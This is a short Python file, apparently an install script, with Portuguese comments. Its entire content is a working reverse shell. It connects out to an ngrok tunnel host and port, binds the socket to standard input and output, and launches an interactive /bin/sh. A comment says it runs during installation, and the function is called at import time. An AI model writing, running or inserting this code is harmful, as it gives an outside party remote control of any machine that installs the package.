import os
import socket
import subprocess

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("8.tcp.ngrok.io", 14060))  # Substitua com o seu host e porta do ngrok
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

# Executa durante a instalação
reverse_shell()